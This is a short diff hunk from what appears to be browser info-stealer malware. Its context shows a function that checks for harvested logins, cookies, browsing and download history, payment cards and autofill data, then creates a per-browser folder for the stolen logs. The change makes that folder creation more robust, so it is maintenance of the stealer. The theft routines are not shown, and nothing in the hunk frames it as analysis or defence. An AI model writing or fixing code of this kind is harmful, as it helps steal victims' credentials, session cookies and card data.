@@ -293,7 +293,7 @@ def Write(pathToLogs, browser):
     if logins or cookies or history or downhistory or cards or autofills:
         try:
             msgInfo+=f"\n🔍{browser}"
-            makedirs(f"{pathToLogs}\\{browser}")
+            makedirs(f"{pathToLogs}\\{browser}", exist_ok=True)
             collected = True
         except: pass
 
